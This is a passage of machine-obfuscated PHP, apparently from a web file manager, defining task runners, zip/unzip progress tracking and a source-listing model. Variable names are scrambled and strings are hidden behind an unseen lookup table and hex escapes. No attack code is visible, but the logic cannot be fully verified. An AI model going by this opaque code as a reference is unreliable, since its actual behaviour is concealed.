IO::fileOutImage($˚áô™ﬁ€[$∆ú¬ä¶[87]], $¨â˝¬´¥); } public function fileOutImage($∑çˆ‡±, $ œ©˚πÿ = 250) { $this->_fileOutImage($∑çˆ‡±, $ œ©˚πÿ); } public function fileOutImageServer($˜Œ¶Öû¿, $ûÙÒéë’ = 250) { $this->_fileOutImage($˜Œ¶Öû¿, $ûÙÒéë’); } public function link($à≈™Úì¡, $Ö˘›’Ω£ = '') { $ÅÕæ´ÁÊ = $this->model->fileInfoGet($à≈™Úì¡); return IO::link($ÅÕæ´ÁÊ[$_SERVER[ß⁄ˆÇ†Œ][87]], $Ö˘›’Ω£); } protected function parse($Ã≠◊™Èπ) { $–Í–ô˜í =& $_SERVER[ß⁄ˆÇ†Œ]; if (strstr($Ã≠◊™Èπ, $–Í–ô˜í[8]) === !1) { return array($–Í–ô˜í[501] => intval($Ã≠◊™Èπ), $–Í–ô˜í[87] => $–Í–ô˜í[12], $–Í–ô˜í[1415] => array()); } $Õ‘›Œîè = explode($–Í–ô˜í[8], trim($Ã≠◊™Èπ, $–Í–ô˜í[8])); if (count($Õ‘›Œîè) < 2) { show_tips(clear_html($Ã≠◊™Èπ) . $–Í–ô˜í[1420]); } return array($–Í–ô˜í[501] => intval($Õ‘›Œîè[0]), $–Í–ô˜í[87] => $Õ‘›Œîè[1], $–Í–ô˜í[1415] => array_slice($Õ‘›Œîè, 1)); } } goto A–®ÚÉÑÚ®; açøáÓ¿ﬁƒ: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($¯»ùùÏ…, $ùÛ˜ÅΩø = 5.0) { if (!$¯»ùùÏ…) { return; } $¨°«õúû = Cache::get($¯»ùùÏ…); if (!$¨°«õúû || timeFloat() - floatVal($¨°«õúû) >= $ùÛ˜ÅΩø) { Cache::set($¯»ùùÏ…, timeFloat(), $ùÛ˜ÅΩø * 10); return !0; } return !1; } public static function timeLimitCall($ôÔ‚÷∫ú, $≠•Ê¯∑€, $ ¡ã≈ù¬, $¿Ç°Áí∂ = 5.0) { $«ﬁë¢ˆÁ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$ôÔ‚÷∫ú || !$≠•Ê¯∑€) { return; } self::$asyncAdd = !0; $¢ˆù⁄¥ú = $«ﬁë¢ˆÁ[1870]; $¡–Ô∞Ö” = Cache::get($¢ˆù⁄¥ú, !0); $ƒØª˝£û = array($«ﬁë¢ˆÁ[1871] => timeFloat(), $«ﬁë¢ˆÁ[1872] => timeFloat(), $«ﬁë¢ˆÁ[350] => $≠•Ê¯∑€, $«ﬁë¢ˆÁ[1862] => $ ¡ã≈ù¬, $«ﬁë¢ˆÁ[206] => $¿Ç°Áí∂); if (is_array($¡–Ô∞Ö”[$ôÔ‚÷∫ú])) { $ƒØª˝£û[$«ﬁë¢ˆÁ[1872]] = $¡–Ô∞Ö”[$ôÔ‚÷∫ú][$«ﬁë¢ˆÁ[1872]]; } if (is_array($¡–Ô∞Ö”[$ôÔ‚÷∫ú])) { if (timeFloat() - $¡–Ô∞Ö”[$ôÔ‚÷∫ú][$«ﬁë¢ˆÁ[1871]] < $ƒØª˝£û[$«ﬁë¢ˆÁ[206]] * 0.3) { return; } $ƒØª˝£û[$«ﬁë¢ˆÁ[1872]] = $¡–Ô∞Ö”[$ôÔ‚÷∫ú][$«ﬁë¢ˆÁ[1872]]; } $¡–Ô∞Ö”[$ôÔ‚÷∫ú] = $ƒØª˝£û; Cache::set($¢ˆù⁄¥ú, $¡–Ô∞Ö”, 60); Cache::removeMemory($¢ˆù⁄¥ú); write_log($«ﬁë¢ˆÁ[1873] . $ôÔ‚÷∫ú . $«ﬁë¢ˆÁ[74] . $≠•Ê¯∑€, $«ﬁë¢ˆÁ[197]); } public static function timeLimitCallLoop() { $Ï˚Ü∏‚‚ =& $_SERVER[ß⁄ˆÇ†Œ]; $ô¶·Ç€§ = array($Ï˚Ü∏‚‚[1874]); $ä¨Íﬂ»ù = in_array(strtolower(ACTION), $ô¶·Ç€§); if (!$ä¨Íﬂ»ù && !self::$asyncAdd) { return; } $ËÎñåê… = $Ï˚Ü∏‚‚[1870]; $ã∑ÃﬁÒŸ = Cache::get($ËÎñåê…, !0); if (!$ã∑ÃﬁÒŸ || count($ã∑ÃﬁÒŸ) <= 0) { return; } $íÀ¥∑µâ = !1; $™‹ÁÙ”Ñ = timeFloat(); $èÌë∫Ï◊ = array(); foreach ($ã∑ÃﬁÒŸ as $¯’◊ôôä => $˙¿˘¥ïË) { if ($™‹ÁÙ”Ñ - $˙¿˘¥ïË[$Ï˚Ü∏‚‚[1872]] > $˙¿˘¥ïË[$Ï˚Ü∏‚‚[206]]) { $íÀ¥∑µâ = !0; try { Hook::apply($˙¿˘¥ïË[$Ï˚Ü∏‚‚[350]], $˙¿˘¥ïË[$Ï˚Ü∏‚‚[1862]]); write_log($Ï˚Ü∏‚‚[1875] . $¯’◊ôôä . $Ï˚Ü∏‚‚[74] . $˙¿˘¥ïË[$Ï˚Ü∏‚‚[350]] . $Ï˚Ü∏‚‚[1876] . ACTION, $Ï˚Ü∏‚‚[197]); } catch (Exception $Çı≈ïË) { } continue; } $èÌë∫Ï◊[$¯’◊ôôä] = $˙¿˘¥ïË; } if (!$íÀ¥∑µâ) { return; } if (!$èÌë∫Ï◊) { return Cache::remove($ËÎñåê…); } Cache::set($ËÎñåê…, $èÌë∫Ï◊, 60); Cache::removeMemory($ËÎñåê…); } public static function finished($™ÆüÌ≈¶, $ÏØÃ´üÊ) { $“›êÔ∑± =& $_SERVER[ß⁄ˆÇ†Œ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($“›êÔ∑±[350] => $™ÆüÌ≈¶, $“›êÔ∑±[1862] => $ÏØÃ´üÊ); } private static function finishedRun() { $Œø‡’Œ‰ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $ ä“Ïâæ) { try { Hook::apply($ ä“Ïâæ[$Œø‡’Œ‰[350]], $ ä“Ïâæ[$Œø‡’Œ‰[1862]]); } catch (Exception $•∏ﬁÜ´Õ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $Û¢¡¿õ« =& $_SERVER[ß⁄ˆÇ†Œ]; parent::startAfter(); Hook::bind($Û¢¡¿õ«[1877], array($this, $Û¢¡¿õ«[1878])); Hook::bind($Û¢¡¿õ«[1274], array($this, $Û¢¡¿õ«[1879])); Hook::bind($Û¢¡¿õ«[1880], array($this, $Û¢¡¿õ«[1881])); $Ãﬁ¿µ¢ò =& $this->task; $Ãﬁ¿µ¢ò[$Û¢¡¿õ«[1882]] = $Û¢¡¿õ«[1275]; if (!$Ãﬁ¿µ¢ò[$Û¢¡¿õ«[1653]]) { $Ãﬁ¿µ¢ò[$Û¢¡¿õ«[1653]] = LNG($Û¢¡¿õ«[1883]); } } protected function endAfter() { $Ü≤ãÖü¿ =& $_SERVER[ß⁄ˆÇ†Œ]; parent::endAfter(); Hook::unbind($Ü≤ãÖü¿[1877], array($this, $Ü≤ãÖü¿[1878])); Hook::unbind($Ü≤ãÖü¿[1274], array($this, $Ü≤ãÖü¿[1879])); Hook::unbind($Ü≤ãÖü¿[1880], array($this, $Ü≤ãÖü¿[1881])); } public function updateAfter() { $îÕÛÍŒ¸ =& $_SERVER[ß⁄ˆÇ†Œ]; $£¢‹ÇæÍ =& $this->task; if (!$£¢‹ÇæÍ[$îÕÛÍŒ¸[1137]] || !$£¢‹ÇæÍ[$îÕÛÍŒ¸[836]]) { if ($£¢‹ÇæÍ[$îÕÛÍŒ¸[1882]] != $îÕÛÍŒ¸[398]) { return; } } if ($£¢‹ÇæÍ[$îÕÛÍŒ¸[1882]] == $îÕÛÍŒ¸[1275]) { $Ò√†≠‘ﬁ = 0; if ($£¢‹ÇæÍ[$îÕÛÍŒ¸[1817]]) { $Ò√†≠‘ﬁ = $£¢‹ÇæÍ[$îÕÛÍŒ¸[1818]] / $£¢‹ÇæÍ[$îÕÛÍŒ¸[1817]]; } $£¢‹ÇæÍ[$îÕÛÍŒ¸[1766]] = $Ò√†≠‘ﬁ * 0.3; } else { if ($£¢‹ÇæÍ[$îÕÛÍŒ¸[1882]] == $îÕÛÍŒ¸[398]) { $Ò√†≠‘ﬁ = $£¢‹ÇæÍ[$îÕÛÍŒ¸[1765]] / $£¢‹ÇæÍ[$îÕÛÍŒ¸[1137]]; $£¢‹ÇæÍ[$îÕÛÍŒ¸[1766]] = 0.3 + $Ò√†≠‘ﬁ * 0.4; } else { if ($£¢‹ÇæÍ[$îÕÛÍŒ¸[1882]] == $îÕÛÍŒ¸[110]) { $„¶˜◊÷· = 0; if ($£¢‹ÇæÍ[$îÕÛÍŒ¸[1819]] == $îÕÛÍŒ¸[110]) { $„¶˜◊÷· = $£¢‹ÇæÍ[$îÕÛÍŒ¸[1818]]; } $Ò√†≠‘ﬁ = ($£¢‹ÇæÍ[$îÕÛÍŒ¸[1822]] + $„¶˜◊÷·) / $£¢‹ÇæÍ[$îÕÛÍŒ¸[836]]; $£¢‹ÇæÍ[$îÕÛÍŒ¸[1766]] = 0.3 + 0.4 + $Ò√†≠‘ﬁ * 0.3; } } } if ($£¢‹ÇæÍ[$îÕÛÍŒ¸[1766]] > 0) { $Ü£õﬂô‚ = timeFloat() - $£¢‹ÇæÍ[$îÕÛÍŒ¸[1768]] - $£¢‹ÇæÍ[$îÕÛÍŒ¸[1771]]; $£¢‹ÇæÍ[$îÕÛÍŒ¸[1772]] = $Ü£õﬂô‚ * (1 - $£¢‹ÇæÍ[$îÕÛÍŒ¸[1766]]) / $£¢‹ÇæÍ[$îÕÛÍŒ¸[1766]]; } } public function addFile($÷Œ—ﬂËò) { $”˘ø›ö≥ =& $_SERVER[ß⁄ˆÇ†Œ]; $ã˛ü∫Áæ =& $this->task; $©£¯Çëº = IO::info($÷Œ—ﬂËò); $ã˛ü∫Áæ[$”˘ø›ö≥[1815]] = $©£¯Çëº[$”˘ø›ö≥[32]]; $ã˛ü∫Áæ[$”˘ø›ö≥[1817]] = $©£¯Çëº[$”˘ø›ö≥[79]]; $ã˛ü∫Áæ[$”˘ø›ö≥[1818]] = 0; $ã˛ü∫Áæ[$”˘ø›ö≥[1139]] = $”˘ø›ö≥[1838]; $ã˛ü∫Áæ[$”˘ø›ö≥[1819]] = $”˘ø›ö≥[1275]; $ã˛ü∫Áæ[$”˘ø›ö≥[836]] = $©£¯Çëº[$”˘ø›ö≥[79]]; $ã˛ü∫Áæ[$”˘ø›ö≥[1137]] = 1; $¢Ê≈ı∞´ = 0; $ã˛ü∫Áæ[$”˘ø›ö≥[1826]] = array($”˘ø›ö≥[1827] => $¢Ê≈ı∞´ + 1, $”˘ø›ö≥[502] => $©£¯Çëº[$”˘ø›ö≥[32]], $”˘ø›ö≥[87] => $©£¯Çëº[$”˘ø›ö≥[87]], $”˘ø›ö≥[590] => $©£¯Çëº[$”˘ø›ö≥[590]] ? $©£¯Çëº[$”˘ø›ö≥[590]] : $©£¯Çëº[$”˘ø›ö≥[87]]); $this->update(); } public function zipEvent($‘¢É≥ï–, $Úé‘ƒ ª, $öê√◊ôÎ, $ˆœ˝∫¢˛) { $í±æ˛›‘ =& $_SERVER[ß⁄ˆÇ†Œ]; $Ü˘µ˝èÑ =& $this->task; $Ü˘µ˝èÑ[$í±æ˛›‘[1815]] = get_path_this($Úé‘ƒ ª); $Ü˘µ˝èÑ[$í±æ˛›‘[1817]] = $ˆœ˝∫¢˛; $Ü˘µ˝èÑ[$í±æ˛›‘[1818]] = $öê√◊ôÎ; $Ü˘µ˝èÑ[$í±æ˛›‘[1139]] = $‘¢É≥ï– == $í±æ˛›‘[1884] ? $í±æ˛›‘[1885] : $í±æ˛›‘[1886]; $Ü˘µ˝èÑ[$í±æ˛›‘[1819]] = $í±æ˛›‘[12]; $Ü˘µ˝èÑ[$í±æ˛›‘[836]] = $ˆœ˝∫¢˛; $Ü˘µ˝èÑ[$í±æ˛›‘[1882]] = $í±æ˛›‘[398]; $this->update(); } public function unzipAfter($∑˝ı•∂¨) { $Âı≈’ﬂÉ =& $_SERVER[ß⁄ˆÇ†Œ]; $‰˚œø›ü =& $this->task; $‰˚œø›ü[$Âı≈’ﬂÉ[1882]] = $Âı≈’ﬂÉ[110]; $ù‹˜©ºú = IO::infoWithChildren($∑˝ı•∂¨); $ˆÌº•¯π = 0; $‰˚œø›ü[$Âı≈’ﬂÉ[1826]] = array($Âı≈’ﬂÉ[1827] => $ˆÌº•¯π + 1, $Âı≈’ﬂÉ[502] => $ù‹˜©ºú[$Âı≈’ﬂÉ[32]], $Âı≈’ﬂÉ[87] => $ù‹˜©ºú[$Âı≈’ﬂÉ[87]], $Âı≈’ﬂÉ[590] => $ù‹˜©ºú[$Âı≈’ﬂÉ[590]] ? $ù‹˜©ºú[$Âı≈’ﬂÉ[590]] : $ù‹˜©ºú[$Âı≈’ﬂÉ[87]]); if ($ù‹˜©ºú[$Âı≈’ﬂÉ[33]] == $Âı≈’ﬂÉ[230]) { $‰˚œø›ü[$Âı≈’ﬂÉ[1137]] = 1; } else { $‰˚œø›ü[$Âı≈’ﬂÉ[1137]] = $ù‹˜©ºú[$Âı≈’ﬂÉ[82]][$Âı≈’ﬂÉ[80]]; } $‰˚œø›ü[$Âı≈’ﬂÉ[1139]] = $Âı≈’ﬂÉ[12]; $‰˚œø›ü[$Âı≈’ﬂÉ[1819]] = 0; $‰˚œø›ü[$Âı≈’ﬂÉ[1765]] = 0; $‰˚œø›ü[$Âı≈’ﬂÉ[1817]] = 0; $‰˚œø›ü[$Âı≈’ﬂÉ[1818]] = 0; $‰˚œø›ü[$Âı≈’ﬂÉ[1815]] = $Âı≈’ﬂÉ[12]; $‰˚œø›ü[$Âı≈’ﬂÉ[1822]] = 0; $‰˚œø›ü[$Âı≈’ﬂÉ[836]] = $ù‹˜©ºú[$Âı≈’ﬂÉ[79]]; $this->update(); self::log($Âı≈’ﬂÉ[1887] . json_encode(array($‰˚œø›ü, $ù‹˜©ºú))); } public function nameParse($µ”°¥√Œ) { $ıü†˘„’ =& $_SERVER[ß⁄ˆÇ†Œ]; $º∏˙˜†á =& $this->task; if ($º∏˙˜†á[$ıü†˘„’[1882]] == $ıü†˘„’[1275]) { $º∏˙˜†á[$ıü†˘„’[1882]] = $ıü†˘„’[398]; $º∏˙˜†á[$ıü†˘„’[1822]] = 0; $º∏˙˜†á[$ıü†˘„’[836]] = 0; } $±‚≥ÛªÂ = get_path_this($µ”°¥√Œ); if (strstr($±‚≥ÛªÂ, $ıü†˘„’[10])) { $º∏˙˜†á[$ıü†˘„’[1765]] += 1; $º∏˙˜†á[$ıü†˘„’[1137]] += 1; } $º∏˙˜†á[$ıü†˘„’[1815]] = $µ”°¥√Œ; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $Œ¡Áà¶Ú =& $_SERVER[ß⁄ˆÇ†Œ]; parent::startAfter(); Hook::bind($Œ¡Áà¶Ú[1888], array($this, $Œ¡Áà¶Ú[1878])); Hook::bind($Œ¡Áà¶Ú[1880], array($this, $Œ¡Áà¶Ú[1881])); $ùÆ§ƒÚ∂ =& $this->task; $ùÆ§ƒÚ∂[$Œ¡Áà¶Ú[1882]] = $Œ¡Áà¶Ú[1275]; if (!$ùÆ§ƒÚ∂[$Œ¡Áà¶Ú[1653]]) { $ùÆ§ƒÚ∂[$Œ¡Áà¶Ú[1653]] = LNG($Œ¡Áà¶Ú[1889]); } } protected function endAfter() { $‰ì“º¬ö =& $_SERVER[ß⁄ˆÇ†Œ]; parent::endAfter(); Hook::unbind($‰ì“º¬ö[1888], array($this, $‰ì“º¬ö[1878])); Hook::unbind($‰ì“º¬ö[1880], array($this, $‰ì“º¬ö[1881])); } public function updateAfter() { $ÕΩ∑‰¥ø =& $_SERVER[ß⁄ˆÇ†Œ]; $íä«·€Ú =& $this->task; if (!$íä«·€Ú[$ÕΩ∑‰¥ø[1137]] || !$íä«·€Ú[$ÕΩ∑‰¥ø[836]]) { return; } if ($íä«·€Ú[$ÕΩ∑‰¥ø[1882]] == $ÕΩ∑‰¥ø[1275]) { $¸ﬁ⁄ï»ˆ = $íä«·€Ú[$ÕΩ∑‰¥ø[1818]]; if ($íä«·€Ú[$ÕΩ∑‰¥ø[1819]] != $ÕΩ∑‰¥ø[1275]) { $¸ﬁ⁄ï»ˆ = 0; } $˜îÚ√ÒÖ = ($íä«·€Ú[$ÕΩ∑‰¥ø[1822]] + $¸ﬁ⁄ï»ˆ) / $íä«·€Ú[$ÕΩ∑‰¥ø[836]]; $íä«·€Ú[$ÕΩ∑‰¥ø[1766]] = $˜îÚ√ÒÖ * 0.3; } else { if ($íä«·€Ú[$ÕΩ∑‰¥ø[1882]] == $ÕΩ∑‰¥ø[398]) { $˜îÚ√ÒÖ = $íä«·€Ú[$ÕΩ∑‰¥ø[1765]] / $íä«·€Ú[$ÕΩ∑‰¥ø[1137]]; $íä«·€Ú[$ÕΩ∑‰¥ø[1766]] = 0.3 + $˜îÚ√ÒÖ * 0.5; } else { if ($íä«·€Ú[$ÕΩ∑‰¥ø[1882]] == $ÕΩ∑‰¥ø[110]) { $˜îÚ√ÒÖ = 0; if ($íä«·€Ú[$ÕΩ∑‰¥ø[1817]]) { $˜îÚ√ÒÖ = $íä«·€Ú[$ÕΩ∑‰¥ø[1818]] / $íä«·€Ú[$ÕΩ∑‰¥ø[1817]]; } $íä«·€Ú[$ÕΩ∑‰¥ø[1766]] = 0.3 + 0.5 + $˜îÚ√ÒÖ * 0.2; } } } if ($íä«·€Ú[$ÕΩ∑‰¥ø[1766]] > 0) { $∫ÖËìäù = timeFloat() - $íä«·€Ú[$ÕΩ∑‰¥ø[1768]] - $íä«·€Ú[$ÕΩ∑‰¥ø[1771]]; $íä«·€Ú[$ÕΩ∑‰¥ø[1772]] = $∫ÖËìäù * (1 - $íä«·€Ú[$ÕΩ∑‰¥ø[1766]]) / $íä«·€Ú[$ÕΩ∑‰¥ø[1766]]; } } public function copyFileStart($çÊ„ıÜ“, $Ç≈¢Âπ·, $‰»üù»Ë, $âÍÔ†–´, $÷ µ›≠Ò, $ ÿÛèîÙ) { $¢í≥◊ﬁô =& $_SERVER[ß⁄ˆÇ†Œ]; parent::copyFileStart($çÊ„ıÜ“, $Ç≈¢Âπ·, $‰»üù»Ë, $âÍÔ†–´, $÷ µ›≠Ò, $ ÿÛèîÙ); $ö†à≈—´ =& $this->task; if ($ö†à≈—´[$¢í≥◊ﬁô[1882]] == $¢í≥◊ﬁô[398]) { $ö†à≈—´[$¢í≥◊ﬁô[1882]] = $¢í≥◊ﬁô[110]; } $this->update(); } public function copyFileEnd($ƒﬂ’íí¸, $€∫›¨È“, $Î¯˚–Ó, $Ûﬂ«ŸûÁ, $©ù˙µ¨î, $∂•†¨¢Ï) { $“⁄Ç˝à≠ =& $_SERVER[ß⁄ˆÇ†Œ]; $√∆∞⁄ûç =& $this->task; $√∆∞⁄ûç[$“⁄Ç˝à≠[1818]] = $√∆∞⁄ûç[$“⁄Ç˝à≠[1817]]; $√∆∞⁄ûç[$“⁄Ç˝à≠[1822]] += $√∆∞⁄ûç[$“⁄Ç˝à≠[1817]]; $√∆∞⁄ûç[$“⁄Ç˝à≠[1819]] = $“⁄Ç˝à≠[12]; $this->update(); } public function zipEvent($Ë¯ÄÀöﬂ, $ÏºãöÇç, $Üπ”ﬂÑŒ, $ü∞±ù¥) { $êóÓ·‹Ç =& $_SERVER[ß⁄ˆÇ†Œ]; $˛ÉÂ‘ˆ‰ =& $this->task; $˛ÉÂ‘ˆ‰[$êóÓ·‹Ç[1815]] = get_path_this($ÏºãöÇç); $˛ÉÂ‘ˆ‰[$êóÓ·‹Ç[1817]] = $ü∞±ù¥; $˛ÉÂ‘ˆ‰[$êóÓ·‹Ç[1818]] = $Üπ”ﬂÑŒ; $˛ÉÂ‘ˆ‰[$êóÓ·‹Ç[1139]] = $Ë¯ÄÀöﬂ == $êóÓ·‹Ç[1890] ? $êóÓ·‹Ç[1885] : $êóÓ·‹Ç[1886]; $˛ÉÂ‘ˆ‰[$êóÓ·‹Ç[1819]] = $êóÓ·‹Ç[12]; $˛ÉÂ‘ˆ‰[$êóÓ·‹Ç[836]] = $ü∞±ù¥; $˛ÉÂ‘ˆ‰[$êóÓ·‹Ç[1882]] = $êóÓ·‹Ç[398]; $this->update(); } public function nameParse($…¡÷´öÎ) { $¥ªà¢”ƒ =& $_SERVER[ß⁄ˆÇ†Œ]; $úﬁı¨â› =& $this->task; if ($úﬁı¨â›[$¥ªà¢”ƒ[1765]] < $úﬁı¨â›[$¥ªà¢”ƒ[1137]]) { $˘√ñâ¨° = get_path_this($…¡÷´öÎ); if (strstr($˘√ñâ¨°, $¥ªà¢”ƒ[10])) { $úﬁı¨â›[$¥ªà¢”ƒ[1765]] += 1; } } if ($úﬁı¨â›[$¥ªà¢”ƒ[1882]] == $¥ªà¢”ƒ[1275]) { $úﬁı¨â›[$¥ªà¢”ƒ[1882]] = $¥ªà¢”ƒ[398]; } $úﬁı¨â›[$¥ªà¢”ƒ[1815]] = $…¡÷´öÎ; $this->update(); } } goto A≠Ïô≥—¬†; DŸßÃ◊îóÓ: class SourceListModel extends ModelBase { protected $tableName = "\151\157\x5f\163\157\x75\x72\143\x65"; protected $tableMeta = array("\x74\141\x62\154\145\x4e\x61\x6d\x65" => "\151\x6f\137\x73\157\x75\x72\x63\145\137\x6d\x65\x74\141", "\155\145\x74\x61\106\x69\x65\x6c\144" => "\163\157\x75\162\x63\x65\x49\104"); protected $dataAuto = array(array("\x6d\x6f\x64\x69\146\171\x54\151\155\145", "\x74\x69\x6d\x65", "\x69\x6e\163\145\x72\x74", "\146\x75\x6e\143\x74\151\x6f\x6e"), array("\x63\x72\x65\x61\x74\145\x54\x69\x6d\x65", "\x74\x69\x6d\145", "\x69\x6e\163\x65\x72\x74", "\146\x75\156\x63\164\x69\x6f\156"), array("\x76\x69\x65\167\124\151\155\x65", "\164\151\x6d\145", "\x69\x6e\163\145\162\164", "\x66\x75\x6e\143\164\151\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($Õ˚ÉÀ≠ ) { return $this->listSource(array($_SERVER[ß⁄ˆÇ†Œ][485] => $Õ˚ÉÀ≠ )); } public function typeName($îùëœÖ∫) { static $“∆æ†˚ç = array(self::TYPE_SYSTEM => "\x73\x79\163\164\145\155", self::TYPE_USER => "\165\x73\x65\x72", self::TYPE_GROUP => "\147\x72\x6f\165\x70"); return $“∆æ†˚ç[$îùëœÖ∫ . $_SERVER[ß⁄ˆÇ†Œ][12]]; } public function sourceListInfo($ØÌπ¯ü¢, $•˛Á´§¬ = false) { $¢º«Ï⁄“ =& $_SERVER[ß⁄ˆÇ†Œ]; $ØÌπ¯ü¢ = $ØÌπ¯ü¢ ? $ØÌπ¯ü¢ : array(); $ØÌπ¯ü¢ = array_filter(array_unique($ØÌπ¯ü¢)); if (!$ØÌπ¯ü¢) { return array(); } $Ïó≤ç˚ó = $this->where(array($¢º«Ï⁄“[193] => array($¢º«Ï⁄“[7], $ØÌπ¯ü¢)))->select(); $this->_listDataApply($Ïó≤ç˚ó, $•˛Á´§¬); return array_to_keyvalue($Ïó≤ç˚ó, $¢º«Ï⁄“[193]); } public function pathInfoFilter(&$ßû„™çÇ) { $ñ‰åõ≥• =& $_SERVER[ß⁄ˆÇ†Œ]; static $€÷§”®ﬁ = false; static $¡á”Á∆– = false; static $ÍŸ£Ì∂ë = false; if (!$€÷§”®ﬁ) { $¢øËÂß» = $ñ‰åõ≥•[486]; $¢øËÂß» .= $ñ‰åõ≥•[487]; $¢øËÂß» .= $ñ‰åõ≥•[488]; $¨¢∫ÔÁ£ = $ñ‰åõ≥•[489]; $∆æè◊æÛ = explode($ñ‰åõ≥•[50], $¨¢∫ÔÁ£); $€÷§”®ﬁ = explode($ñ‰åõ≥•[50], $¢øËÂß»); $¡á”Á∆– = array(); foreach ($€÷§”®ﬁ as $ßö·≈È…) { if (in_array($ßö·≈È…, $∆æè◊æÛ)) { continue; } $¡á”Á∆–[] = $ßö·≈È…; } $ÍŸ£Ì∂ë = explode($ñ‰åõ≥•[50], $ñ‰åõ≥•[490]); } foreach ($ÍŸ£Ì∂ë as $õóŒ®‡„) { if (isset($ßû„™çÇ[$õóŒ®‡„])) { $ßû„™çÇ[$õóŒ®‡„] = intval($ßû„™çÇ[$õóŒ®‡„]); } } $ßû„™çÇ[$ñ‰åõ≥•[87]] = $ñ‰åõ≥•[491] . $ßû„™çÇ[$ñ‰åõ≥•[193]] . $ñ‰åõ≥•[492]; $ßû„™çÇ[$ñ‰åõ≥•[33]] = $ßû„™çÇ[$ñ‰åõ≥•[493]] == 1 ? $ñ‰åõ≥•[78] : $ñ‰åõ≥•[230]; $ßû„™çÇ[$ñ‰åõ≥•[190]] = $this->typeName($ßû„™çÇ[$ñ‰åõ≥•[190]]); if ($ßû„™çÇ[$ñ‰åõ≥•[493]] != 1) { $ßû„™çÇ[$ñ‰åõ≥•[169]] = $ßû„™çÇ[$ñ‰åõ≥•[494]]; unset($ßû„™çÇ[$ñ‰åõ≥•[494]]); } $äÕÁ›§¬ = $€÷§”®ﬁ; if (isset($ßû„™çÇ[$ñ‰åõ≥•[495]]) && $ßû„™çÇ[$ñ‰åõ≥•[495]][$ñ‰åõ≥•[496]] == -1) { $äÕÁ›§¬ = $¡á”Á∆–; } $ßû„™çÇ = array_field_key($ßû„™çÇ, $äÕÁ›§¬); return $ßû„™çÇ; } public function listUserFav() { $÷◊ó‹Àú =& $_SERVER[ß⁄ˆÇ†Œ]; $û∆äÖŒ¡ = Model($÷◊ó‹Àú[497])->listData(); $î‚ûÁä© = array_filter_by_field($û∆äÖŒ¡, $÷◊ó‹Àú[33], $÷◊ó‹Àú[498]); $î‚ûÁä© = array_to_keyvalue($î‚ûÁä©, $÷◊ó‹Àú[12], $÷◊ó‹Àú[87]); if ($î‚ûÁä©) { $˝Ÿ∞âÁ≥ = $this->listSource(array($÷◊ó‹Àú[499] => array($÷◊ó‹Àú[500], $î‚ûÁä©))); } $˝Ÿ∞âÁ≥ = array_to_keyvalue($˝Ÿ∞âÁ≥[$÷◊ó‹Àú[454]], $÷◊ó‹Àú[193]); foreach ($û∆äÖŒ¡ as &$ñıÄ˛Ì˛) { $ñıÄ˛Ì˛ = array($÷◊ó‹Àú[501] => $ñıÄ˛Ì˛[$÷◊ó‹Àú[483]], $÷◊ó‹Àú[502] => $ñıÄ˛Ì˛[$÷◊ó‹Àú[32]], $÷◊ó‹Àú[503] => $ñıÄ˛Ì˛[$÷◊ó‹Àú[87]], $÷◊ó‹Àú[504] => $ñıÄ˛Ì˛[$÷◊ó‹Àú[33]], $÷◊ó‹Àú[505] => $ñıÄ˛Ì˛[$÷◊ó‹Àú[231]], $÷◊ó‹Àú[506] => $ñıÄ˛Ì˛[$÷◊ó‹Àú[88]]); if ($ñıÄ˛Ì˛[$÷◊ó‹Àú[33]] == $÷◊ó‹Àú[498] && $˝Ÿ∞âÁ≥[$ñıÄ˛Ì˛[$÷◊ó‹Àú[87]]]) { $ñıÄ˛Ì˛[$÷◊ó‹Àú[90]] = $˝Ÿ∞âÁ≥[$ñıÄ˛Ì˛[$÷◊ó‹Àú[87]]]; } } unset($ñıÄ˛Ì˛); return $û∆äÖŒ¡; } public function listUserTag($Œ¡ÉÿÚá) { $¥˛¯–≈≤ =& $_SERVER[ß⁄ˆÇ†Œ]; if ($Œ¡ÉÿÚá && !is_array($Œ¡ÉÿÚá)) { $Œ¡ÉÿÚá = array($Œ¡ÉÿÚá); } $ı£¯ÏŸÎ = Model($¥˛¯–≈≤[507])->listData(); $À˝˝Ù í = array(); $™„àﬁ»û = array(); foreach ($ı£¯ÏŸÎ as $æêÌ˜ûÇ) { $ªòØ‹µÏ = $æêÌ˜ûÇ[$¥˛¯–≈≤[87]]; if (!$ªòØ‹µÏ) { continue; } if (!isset($™„àﬁ»û[$ªòØ‹µÏ])) { $™„àﬁ»û[$ªòØ‹µÏ] = array(); } $™„àﬁ»û[$ªòØ‹µÏ][] = $æêÌ˜ûÇ[$¥˛¯–≈≤[508]]; $À˝˝Ù í[$æêÌ˜ûÇ[$¥˛¯–≈≤[87]]] = $æêÌ˜ûÇ; } $È œ˙·˛ = array(); $ßñ¯‹≈§ = array(); $ë÷“–äë = array(); foreach ($™„àﬁ»û as $ï”îü°ô => $ò¡≠‰Æõ) { $ËíÙîÆ™ = !0; if (!$Œ¡ÉÿÚá) { $È œ˙·˛[] = $ï”îü°ô; continue; } foreach ($Œ¡ÉÿÚá as $‹˝©™◊§) { if (!in_array($‹˝©™◊§, $ò¡≠‰Æõ)) { $ËíÙîÆ™ = !1; break; } } if (!$ËíÙîÆ™) { continue; } if (!is_numeric($ï”îü°ô)) { $èºóØ˛ﬁ = $À˝˝Ù í[$ï”îü°ô]; $¥ﬁ£®ßõ = array($¥˛¯–≈≤[32] => $èºóØ˛ﬁ[$¥˛¯–≈≤[32]], $¥˛¯–≈≤[87] => $èºóØ˛ﬁ[$¥˛¯–≈≤[87]], $¥˛¯–≈≤[33] => $èºóØ˛ﬁ[$¥˛¯–≈≤[33]], $¥˛¯–≈≤[90] => array($¥˛¯–≈≤[509] => 1), $¥˛¯–≈≤[232] => !0); if ($èºóØ˛ﬁ[$¥˛¯–≈≤[33]] == $¥˛¯–≈≤[230]) { $ë÷“–äë[] = $¥ﬁ£®ßõ; } if 